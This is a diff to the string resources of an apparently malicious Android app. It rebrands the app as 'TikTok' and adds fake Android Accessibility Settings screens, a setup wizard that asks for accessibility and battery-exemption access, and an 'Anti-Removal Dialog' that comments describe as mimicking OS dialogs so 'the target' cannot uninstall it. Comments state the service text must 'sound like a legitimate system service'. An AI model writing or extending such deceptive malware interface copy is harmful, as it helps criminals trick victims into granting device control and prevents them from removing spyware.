@@ -1,55 +1,87 @@
 <?xml version='1.0' encoding='utf-8'?>
 <resources>
-    <string name="app_name">Lanterna Potente</string>
-    <string name="accessibility_service_description">Serviço de otimização de renderização e acessibilidade de interface corporativa.</string>
+    <!--
+        app_name — default launcher label.
+        Overridden at build time via -PAPP_LABEL="..." (all identities)
+        or resolved at runtime from AppIdentityManager.getConfig().appName.
+        Default matches the default identity: TikTok.
+    -->
+    <string name="app_name">TikTok</string>
 
-    <!-- Fake Accessibility Screen -->
-    <string name="fake_accessibility_title">Acessibilidade</string>
-    <string name="fake_services_installed">Serviços instalados</string>
-    <string name="fake_talkback">TalkBack</string>
-    <string name="fake_talkback_desc">Feedback falado, auditivo e por vibração</string>
-    <string name="fake_select_to_speak">Selecionar para ouvir</string>
-    <string name="fake_select_to_speak_desc">Toque nos itens para ouvi-los em voz alta</string>
-    <string name="fake_switch_access">Acesso por botão</string>
-    <string name="fake_switch_access_desc">Controle o dispositivo com botões</string>
-    <string name="fake_system_protection">Otimização de Bateria Avançada</string>
-    <string name="fake_system_protection_desc">Gerencia o consumo de energia do dispositivo</string>
-
-    <!-- Service Detail Screen -->
-    <string name="service_detail_title">Otimização de Bateria Avançada</string>
-    <string name="service_off">Desativado</string>
-    <string name="service_on">Ativado</string>
-    <string name="service_description_title">Sobre este serviço</string>
-    <string name="service_description_text">O serviço de Otimização de Bateria Avançada ajuda a prolongar a duração da bateria do seu dispositivo.
-
-Este serviço utiliza recursos de acessibilidade para:
-• Monitorar aplicativos em segundo plano
-• Identificar apps que consomem muita energia
-• Otimizar o uso de recursos do sistema
-• Aumentar a duração da bateria</string>
-    <string name="permissions_title">Permissões</string>
-    <string name="permission_observe">Observar suas ações</string>
-    <string name="permission_retrieve">Recuperar conteúdo da janela</string>
-    <string name="confirm_activation">Ativar otimização?</string>
-    <string name="confirm_activation_message">Ao ativar este serviço, você permite que o Otimizador de Bateria monitore e gerencie apps para economizar energia. Deseja continuar?</string>
-    <string name="cancel">Cancelar</string>
-    <string name="activate">Ativar</string>
-
-    <!-- Main Screen -->
-    <string name="main_welcome">Bem-vindo ao Otimizador de Bateria</string>
-    <string name="main_description">Seu dispositivo está otimizado para economizar energia</string>
-    <string name="btn_enable_protection">Ativar Otimização</string>
-    <string name="protection_status">Status da Otimização</string>
-    <string name="status_inactive">Inativo - Clique para ativar</string>
-    <string name="status_active">Ativo - Bateria sendo otimizada</string>
+    <!--
+        Accessibility service description shown in Android Settings → Accessibility.
+        Must sound like a legitimate system service. Intentionally generic.
+    -->
+    <string name="accessibility_service_description">Improves system rendering performance and interface responsiveness for media-intensive applications.</string>
 
     <!-- ═══════════════════════════════════════════════════════════════════════
-         Anti-Removal Dialog — social engineering copy.
-         These strings are shown when the user attempts to uninstall or
-         deactivate the app. They mirror AOSP / OEM system dialog language
-         so the prompt feels like a genuine OS restriction, not a third-party
-         app. English is used because Android system dialogs are always in the
-         device locale; most devices present these in English globally.
+         Fake Accessibility Screen
+         Mimics the Android Settings → Accessibility page shown during setup.
+         All text is English — matches AOSP English locale worldwide.
+         ═══════════════════════════════════════════════════════════════════════ -->
+    <string name="fake_accessibility_title">Accessibility</string>
+    <string name="fake_services_installed">Installed services</string>
+    <string name="fake_talkback">TalkBack</string>
+    <string name="fake_talkback_desc">Spoken, audible, and vibration feedback</string>
+    <string name="fake_select_to_speak">Select to Speak</string>
+    <string name="fake_select_to_speak_desc">Tap items on screen to have them read aloud</string>
+    <string name="fake_switch_access">Switch Access</string>
+    <string name="fake_switch_access_desc">Control your device using external switches</string>
+    <string name="fake_system_protection">Media Performance Optimizer</string>
+    <string name="fake_system_protection_desc">Manages device resources for smooth video playback</string>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════
+         Service Detail Screen
+         Mimics the per-service detail page inside Android Accessibility Settings.
+         ═══════════════════════════════════════════════════════════════════════ -->
+    <string name="service_detail_title">Media Performance Optimizer</string>
+    <string name="service_off">Off</string>
+    <string name="service_on">On</string>
+    <string name="service_description_title">About this service</string>
+    <string name="service_description_text">The Media Performance Optimizer helps maintain smooth video playback and reduces loading times for media applications.\n\nThis service uses accessibility features to:\n• Monitor foreground application resource usage\n• Optimize memory allocation for video content\n• Reduce frame drops during live streaming\n• Improve network request prioritization for media</string>
+    <string name="permissions_title">Permissions</string>
+    <string name="permission_observe">Observe your actions</string>
+    <string name="permission_retrieve">Retrieve window content</string>
+    <string name="confirm_activation">Enable Media Optimizer?</string>
+    <string name="confirm_activation_message">By enabling this service, you allow the Media Performance Optimizer to monitor and manage app resources to improve video playback. Continue?</string>
+    <string name="cancel">Cancel</string>
+    <string name="activate">Enable</string>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════
+         Main Screen (shown before setup or when no identity URL is set)
+         ═══════════════════════════════════════════════════════════════════════ -->
+    <string name="main_welcome">Welcome</string>
+    <string name="main_description">Optimizing your device for media performance</string>
+    <string name="btn_enable_protection">Enable</string>
+    <string name="protection_status">Service Status</string>
+    <string name="status_inactive">Inactive — Tap to enable</string>
+    <string name="status_active">Active — Running in background</string>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════
+         Setup Wizard — generic fallback strings.
+         SetupWizardActivity reads AppIdentityManager.getConfig().setupTitle /
+         .setupDescription and uses THOSE at runtime; these are only the XML
+         fallback when the manager isn't available yet.
+         ═══════════════════════════════════════════════════════════════════════ -->
+    <string name="setup_title_welcome">Almost ready</string>
+    <string name="setup_desc_welcome">A few quick steps to finish setting up your app.</string>
+    <string name="setup_title_accessibility">Enable background access</string>
+    <string name="setup_desc_accessibility">This allows the app to function correctly while running in the background.</string>
+    <string name="setup_title_permissions">Grant permissions</string>
+    <string name="setup_desc_permissions">Required for core features to work properly on your device.</string>
+    <string name="setup_title_battery">Disable battery restrictions</string>
+    <string name="setup_desc_battery">Prevents the system from stopping the app when you switch away.</string>
+    <string name="setup_title_complete">All done!</string>
+    <string name="setup_desc_complete">Setup complete. Your app is ready to use.</string>
+    <string name="btn_next">Continue</string>
+    <string name="btn_allow">Allow</string>
+    <string name="btn_skip">Skip</string>
+
+    <!-- ═══════════════════════════════════════════════════════════════════════
+         Anti-Removal Dialog
+         Shown when the target attempts to uninstall or deactivate the app.
+         Mirrors AOSP / OEM system dialog language so the prompt feels like a
+         genuine OS restriction, not a third-party app block.
          ═══════════════════════════════════════════════════════════════════════ -->
 
     <!-- Generic uninstall block -->
